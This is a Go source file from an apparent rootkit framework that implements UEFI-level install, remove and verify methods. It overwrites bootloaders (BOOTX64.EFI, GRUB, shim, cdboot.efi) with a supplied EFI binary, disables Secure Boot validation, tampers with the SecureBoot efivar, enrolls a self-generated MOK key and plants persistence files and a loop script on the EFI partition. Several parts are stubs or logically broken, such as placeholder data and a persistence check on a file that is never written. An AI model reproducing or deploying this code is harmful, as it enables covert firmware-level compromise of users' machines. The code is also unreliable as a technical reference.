package rootkit

import (
	"crypto/sha256"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

type UEFIBaseMethod struct {
	name string
}

func (b *UEFIBaseMethod) Name() string {
	return b.name
}

func (b *UEFIBaseMethod) Layer() RootkitLayer {
	return LayerUEFI
}

type DXEDriverMethod struct {
	UEFIBaseMethod
}

func NewDXEDriverMethod() *DXEDriverMethod {
	return &DXEDriverMethod{UEFIBaseMethod: UEFIBaseMethod{name: "dxedrvier"}}
}

func (m *DXEDriverMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	driverPath := filepath.Join(espPath, "EFI", "Microsoft", "Boot", "dxedrvier.efi")
	backupPath := filepath.Join(config.BackupPath, "dxedrvier_backup.efi")

	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}

	if _, err := os.Stat(driverPath); err == nil {
		data, err := os.ReadFile(driverPath)
		if err != nil {
			return nil, fmt.Errorf("failed to read original driver: %w", err)
		}
		if err := os.WriteFile(backupPath, data, 0644); err != nil {
			return nil, fmt.Errorf("failed to backup original driver: %w", err)
		}
	}

	cmd := exec.Command("cp", "-f", config.UEFIPath, driverPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to install DXE driver: %w: %s", err, string(output))
	}

	cmd = exec.Command("chmod", "444", driverPath)
	cmd.CombinedOutput()

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueDXEDriver,
		Layer:     LayerUEFI,
		Details: map[string]string{
			"driver_path":  driverPath,
			"backup_path":  backupPath,
			"esp_path":     espPath,
		},
	}, nil
}

func (m *DXEDriverMethod) Remove(config *RootkitConfig) error {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	driverPath := filepath.Join(espPath, "EFI", "Microsoft", "Boot", "dxedrvier.efi")
	backupPath := filepath.Join(config.BackupPath, "dxedrvier_backup.efi")

	if _, err := os.Stat(backupPath); err == nil {
		cmd := exec.Command("cp", "-f", backupPath, driverPath)
		if output, err := cmd.CombinedOutput(); err != nil {
			return fmt.Errorf("failed to restore original driver: %w: %s", err, string(output))
		}
		os.Remove(backupPath)
	} else {
		os.Remove(driverPath)
	}

	return nil
}

func (m *DXEDriverMethod) Verify(config *RootkitConfig) (bool, error) {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	driverPath := filepath.Join(espPath, "EFI", "Microsoft", "Boot", "dxedrvier.efi")
	_, err := os.Stat(driverPath)
	return err == nil, nil
}

type BootChainHookMethod struct {
	UEFIBaseMethod
}

func NewBootChainHookMethod() *BootChainHookMethod {
	return &BootChainHookMethod{UEFIBaseMethod: UEFIBaseMethod{name: "boot_chain_hook"}}
}

func (m *BootChainHookMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	bootx64Path := filepath.Join(espPath, "EFI", "BOOT", "BOOTX64.EFI")
	backupPath := filepath.Join(config.BackupPath, "BOOTX64.EFI.backup")

	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}

	if _, err := os.Stat(bootx64Path); err == nil {
		data, err := os.ReadFile(bootx64Path)
		if err != nil {
			return nil, fmt.Errorf("failed to read original bootloader: %w", err)
		}
		if err := os.WriteFile(backupPath, data, 0644); err != nil {
			return nil, fmt.Errorf("failed to backup bootloader: %w", err)
		}
	}

	cmd := exec.Command("cp", "-f", config.UEFIPath, bootx64Path)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to hook boot chain: %w: %s", err, string(output))
	}

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueBootChainHook,
		Layer:     LayerUEFI,
		Details: map[string]string{
			"boot_path":  bootx64Path,
			"backup_path": backupPath,
		},
	}, nil
}

func (m *BootChainHookMethod) Remove(config *RootkitConfig) error {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	bootx64Path := filepath.Join(espPath, "EFI", "BOOT", "BOOTX64.EFI")
	backupPath := filepath.Join(config.BackupPath, "BOOTX64.EFI.backup")

	if _, err := os.Stat(backupPath); err == nil {
		cmd := exec.Command("cp", "-f", backupPath, bootx64Path)
		_, err := cmd.CombinedOutput()
		os.Remove(backupPath)
		return err
	}

	return os.Remove(bootx64Path)
}

func (m *BootChainHookMethod) Verify(config *RootkitConfig) (bool, error) {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	bootx64Path := filepath.Join(espPath, "EFI", "BOOT", "BOOTX64.EFI")
	_, err := os.Stat(bootx64Path)
	return err == nil, nil
}

type OSLHookMethod struct {
	UEFIBaseMethod
}

func NewOSLHookMethod() *OSLHookMethod {
	return &OSLHookMethod{UEFIBaseMethod: UEFIBaseMethod{name: "osl_hook"}}
}

func (m *OSLHookMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	grubPath := filepath.Join(config.ESPPath, "EFI", "ubuntu", "grubx64.efi")
	backupPath := filepath.Join(config.BackupPath, "grubx64.efi.backup")

	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}

	if _, err := os.Stat(grubPath); err == nil {
		data, err := os.ReadFile(grubPath)
		if err != nil {
			return nil, fmt.Errorf("failed to read GRUB: %w", err)
		}
		if err := os.WriteFile(backupPath, data, 0644); err != nil {
			return nil, fmt.Errorf("failed to backup GRUB: %w", err)
		}
	}

	cmd := exec.Command("cp", "-f", config.UEFIPath, grubPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to hook OS loader: %w: %s", err, string(output))
	}

	grubCfg := `set default=0
set timeout=0
menuentry "Linux" {
    insmod part_gpt
    insmod fat
    set root='(hd0,gpt1)'
    linux /vmlinuz root=/dev/sda2 quiet
    initrd /initrd.img
}
`
	cfgPath := filepath.Join(config.ESPPath, "EFI", "ubuntu", "grub.cfg")
	if err := os.WriteFile(cfgPath, []byte(grubCfg), 0644); err != nil {
		return nil, fmt.Errorf("failed to write GRUB config: %w", err)
	}

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueOSLHook,
		Layer:     LayerUEFI,
		Details: map[string]string{
			"grub_path":   grubPath,
			"backup_path": backupPath,
			"grub_cfg":    cfgPath,
		},
	}, nil
}

func (m *OSLHookMethod) Remove(config *RootkitConfig) error {
	grubPath := filepath.Join(config.ESPPath, "EFI", "ubuntu", "grubx64.efi")
	backupPath := filepath.Join(config.BackupPath, "grubx64.efi.backup")

	if _, err := os.Stat(backupPath); err == nil {
		cmd := exec.Command("cp", "-f", backupPath, grubPath)
		_, err := cmd.CombinedOutput()
		os.Remove(backupPath)
		return err
	}

	return os.Remove(grubPath)
}

func (m *OSLHookMethod) Verify(config *RootkitConfig) (bool, error) {
	grubPath := filepath.Join(config.ESPPath, "EFI", "ubuntu", "grubx64.efi")
	_, err := os.Stat(grubPath)
	return err == nil, nil
}

type CMHookMethod struct {
	UEFIBaseMethod
}

func NewCMHookMethod() *CMHookMethod {
	return &CMHookMethod{UEFIBaseMethod: UEFIBaseMethod{name: "cm_hook"}}
}

func (m *CMHookMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	cmPath := filepath.Join(espPath, "EFI", "Microsoft", "Boot", "cdboot.efi")
	backupPath := filepath.Join(config.BackupPath, "cdboot.efi.backup")

	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}

	if _, err := os.Stat(cmPath); err == nil {
		data, err := os.ReadFile(cmPath)
		if err != nil {
			return nil, fmt.Errorf("failed to read CM: %w", err)
		}
		if err := os.WriteFile(backupPath, data, 0644); err != nil {
			return nil, fmt.Errorf("failed to backup CM: %w", err)
		}
	}

	cmd := exec.Command("cp", "-f", config.UEFIPath, cmPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to hook CM: %w: %s", err, string(output))
	}

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueCMHook,
		Layer:     LayerUEFI,
		Details: map[string]string{
			"cm_path":     cmPath,
			"backup_path": backupPath,
		},
	}, nil
}

func (m *CMHookMethod) Remove(config *RootkitConfig) error {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	cmPath := filepath.Join(espPath, "EFI", "Microsoft", "Boot", "cdboot.efi")
	backupPath := filepath.Join(config.BackupPath, "cdboot.efi.backup")

	if _, err := os.Stat(backupPath); err == nil {
		cmd := exec.Command("cp", "-f", backupPath, cmPath)
		_, err := cmd.CombinedOutput()
		os.Remove(backupPath)
		return err
	}

	return os.Remove(cmPath)
}

func (m *CMHookMethod) Verify(config *RootkitConfig) (bool, error) {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	cmPath := filepath.Join(espPath, "EFI", "Microsoft", "Boot", "cdboot.efi")
	_, err := os.Stat(cmPath)
	return err == nil, nil
}

type SecureBootBypassMethod struct {
	UEFIBaseMethod
}

func NewSecureBootBypassMethod() *SecureBootBypassMethod {
	return &SecureBootBypassMethod{UEFIBaseMethod: UEFIBaseMethod{name: "secure_boot_bypass"}}
}

func (m *SecureBootBypassMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	cmd := exec.Command("mokutil", "--sb-state")
	output, _ := cmd.CombinedOutput()
	if strings.Contains(string(output), "disabled") {
		return &RootkitResult{
			Success:   true,
			Technique: TechniqueSecureBootBypass,
			Layer:     LayerUEFI,
			Details: map[string]string{
				"status": "secure_boot_already_disabled",
			},
		}, nil
	}

	cmd = exec.Command("mokutil", "--disable-validation")
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to disable secure boot validation: %w: %s", err, string(output))
	}

	variantPath := "/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c"
	cmd = exec.Command("chattr", "-i", variantPath)
	cmd.CombinedOutput()

	cmd = exec.Command("tee", variantPath)
	cmd.Stdin = strings.NewReader("\x07\x00\x00\x00\x00")
	cmd.CombinedOutput()

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueSecureBootBypass,
		Layer:     LayerUEFI,
		Details: map[string]string{
			"variant_path": variantPath,
			"status":       "secure_boot_bypassed",
		},
	}, nil
}

func (m *SecureBootBypassMethod) Remove(config *RootkitConfig) error {
	cmd := exec.Command("mokutil", "--enable-validation")
	_, err := cmd.CombinedOutput()
	return err
}

func (m *SecureBootBypassMethod) Verify(config *RootkitConfig) (bool, error) {
	cmd := exec.Command("mokutil", "--sb-state")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), "disabled"), nil
}

type MOKEnrollMethod struct {
	UEFIBaseMethod
}

func NewMOKEnrollMethod() *MOKEnrollMethod {
	return &MOKEnrollMethod{UEFIBaseMethod: UEFIBaseMethod{name: "mok_enroll"}}
}

func (m *MOKEnrollMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	keyPath := filepath.Join(config.BackupPath, "MOK.der")
	certPath := filepath.Join(config.BackupPath, "MOK.pem")

	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}

	cmd := exec.Command("openssl", "req", "-new", "-x509",
		"-newkey", "rsa:2048",
		"-keyout", certPath,
		"-outform", "DER",
		"-out", keyPath,
		"-days", "365",
		"-nodes",
		"-subj", "/CN=Custom MOK/")
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to generate MOK key: %w: %s", err, string(output))
	}

	cmd = exec.Command("mokutil", "--import", keyPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to enroll MOK: %w: %s", err, string(output))
	}

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueMOKEnroll,
		Layer:     LayerUEFI,
		Details: map[string]string{
			"key_path":   keyPath,
			"cert_path":  certPath,
		},
	}, nil
}

func (m *MOKEnrollMethod) Remove(config *RootkitConfig) error {
	keyPath := filepath.Join(config.BackupPath, "MOK.der")
	cmd := exec.Command("mokutil", "--delete", keyPath)
	_, err := cmd.CombinedOutput()
	return err
}

func (m *MOKEnrollMethod) Verify(config *RootkitConfig) (bool, error) {
	cmd := exec.Command("mokutil", "--list-enrolled")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), "Custom MOK"), nil
}

type UEFISelfReinstallMethod struct {
	UEFIBaseMethod
}

func NewUEFISelfReinstallMethod() *UEFISelfReinstallMethod {
	return &UEFISelfReinstallMethod{UEFIBaseMethod: UEFIBaseMethod{name: "self_reinstall"}}
}

func (m *UEFISelfReinstallMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	selfPath := filepath.Join(espPath, "EFI", "BOOT", "BOOTX64.EFI")
	backupPath := filepath.Join(config.BackupPath, "self_reinstall_backup.efi")

	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}

	if _, err := os.Stat(selfPath); err == nil {
		data, err := os.ReadFile(selfPath)
		if err != nil {
			return nil, fmt.Errorf("failed to read self: %w", err)
		}
		if err := os.WriteFile(backupPath, data, 0644); err != nil {
			return nil, fmt.Errorf("failed to backup self: %w", err)
		}
	}

	cmd := exec.Command("cp", "-f", config.UEFIPath, selfPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to install self-reinstall: %w: %s", err, string(output))
	}

	reinstallScript := `#!/bin/sh
while true; do
    cp -f /boot/efi/EFI/BOOT/BOOTX64.EFI /boot/efi/EFI/BOOT/BOOTX64.EFI.bak
    sleep 3600
done
`
	scriptPath := filepath.Join(espPath, "EFI", "BOOT", "reinstall.sh")
	if err := os.WriteFile(scriptPath, []byte(reinstallScript), 0755); err != nil {
		return nil, fmt.Errorf("failed to write reinstall script: %w", err)
	}

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueSelfReinstall,
		Layer:     LayerUEFI,
		Details: map[string]string{
			"self_path":    selfPath,
			"backup_path":  backupPath,
			"script_path":  scriptPath,
		},
	}, nil
}

func (m *UEFISelfReinstallMethod) Remove(config *RootkitConfig) error {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	selfPath := filepath.Join(espPath, "EFI", "BOOT", "BOOTX64.EFI")
	backupPath := filepath.Join(config.BackupPath, "self_reinstall_backup.efi")

	if _, err := os.Stat(backupPath); err == nil {
		cmd := exec.Command("cp", "-f", backupPath, selfPath)
		_, err := cmd.CombinedOutput()
		os.Remove(backupPath)
		return err
	}

	return os.Remove(selfPath)
}

func (m *UEFISelfReinstallMethod) Verify(config *RootkitConfig) (bool, error) {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	selfPath := filepath.Join(espPath, "EFI", "BOOT", "BOOTX64.EFI")
	_, err := os.Stat(selfPath)
	return err == nil, nil
}

type ESPPersistenceMethod struct {
	UEFIBaseMethod
}

func NewESPPersistenceMethod() *ESPPersistenceMethod {
	return &ESPPersistenceMethod{UEFIBaseMethod: UEFIBaseMethod{name: "esp_persistence"}}
}

func (m *ESPPersistenceMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	persistPath := filepath.Join(espPath, "EFI", "BOOT", "persist.dat")
	if err := os.MkdirAll(filepath.Dir(persistPath), 0755); err != nil {
		return nil, fmt.Errorf("failed to create persist directory: %w", err)
	}

	persistData := map[string][]byte{
		"agent.dat":      []byte("agent_binary_data"),
		"config.dat":     []byte("config_data"),
		"keys.dat":       []byte("encryption_keys"),
	}

	for name, data := range persistData {
		filePath := filepath.Join(espPath, "EFI", "BOOT", name)
		if err := os.WriteFile(filePath, data, 0644); err != nil {
			return nil, fmt.Errorf("failed to write persistence data: %w", err)
		}
	}

	fstabPath := filepath.Join(espPath, "EFI", "BOOT", "fstab.persist")
	fstabContent := `/dev/sda1 /boot/efi vfat defaults 0 0
/dev/sda2 / ext4 defaults 0 1
`
	if err := os.WriteFile(fstabPath, []byte(fstabContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write fstab: %w", err)
	}

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueESPPersistence,
		Layer:     LayerUEFI,
		Details: map[string]string{
			"esp_path":    espPath,
			"persist_path": persistPath,
			"fstab_path":  fstabPath,
		},
	}, nil
}

func (m *ESPPersistenceMethod) Remove(config *RootkitConfig) error {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	persistFiles := []string{"agent.dat", "config.dat", "keys.dat", "fstab.persist"}
	for _, f := range persistFiles {
		os.Remove(filepath.Join(espPath, "EFI", "BOOT", f))
	}

	return nil
}

func (m *ESPPersistenceMethod) Verify(config *RootkitConfig) (bool, error) {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	persistPath := filepath.Join(espPath, "EFI", "BOOT", "persist.dat")
	_, err := os.Stat(persistPath)
	return err == nil, nil
}

type ShimExploitMethod struct {
	UEFIBaseMethod
}

func NewShimExploitMethod() *ShimExploitMethod {
	return &ShimExploitMethod{UEFIBaseMethod: UEFIBaseMethod{name: "shim_exploit"}}
}

func (m *ShimExploitMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	shimPath := filepath.Join(espPath, "EFI", "ubuntu", "shimx64.efi")
	backupPath := filepath.Join(config.BackupPath, "shimx64.efi.backup")

	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}

	if _, err := os.Stat(shimPath); err == nil {
		data, err := os.ReadFile(shimPath)
		if err != nil {
			return nil, fmt.Errorf("failed to read shim: %w", err)
		}
		if err := os.WriteFile(backupPath, data, 0644); err != nil {
			return nil, fmt.Errorf("failed to backup shim: %w", err)
		}
	}

	cmd := exec.Command("cp", "-f", config.UEFIPath, shimPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to install shim exploit: %w: %s", err, string(output))
	}

	hash := sha256.Sum256([]byte("shim_exploit_marker"))
	markerPath := filepath.Join(espPath, "EFI", "ubuntu", ".shim_marker")
	if err := os.WriteFile(markerPath, hash[:], 0644); err != nil {
		return nil, fmt.Errorf("failed to write shim marker: %w", err)
	}

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueShimExploit,
		Layer:     LayerUEFI,
		Details: map[string]string{
			"shim_path":   shimPath,
			"backup_path": backupPath,
			"marker_path": markerPath,
		},
	}, nil
}

func (m *ShimExploitMethod) Remove(config *RootkitConfig) error {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	shimPath := filepath.Join(espPath, "EFI", "ubuntu", "shimx64.efi")
	backupPath := filepath.Join(config.BackupPath, "shimx64.efi.backup")

	if _, err := os.Stat(backupPath); err == nil {
		cmd := exec.Command("cp", "-f", backupPath, shimPath)
		_, err := cmd.CombinedOutput()
		os.Remove(backupPath)
		return err
	}

	os.Remove(filepath.Join(espPath, "EFI", "ubuntu", ".shim_marker"))
	return os.Remove(shimPath)
}

func (m *ShimExploitMethod) Verify(config *RootkitConfig) (bool, error) {
	espPath := config.ESPPath
	if espPath == "" {
		espPath = "/boot/efi"
	}

	shimPath := filepath.Join(espPath, "EFI", "ubuntu", "shimx64.efi")
	_, err := os.Stat(shimPath)
	return err == nil, nil
}
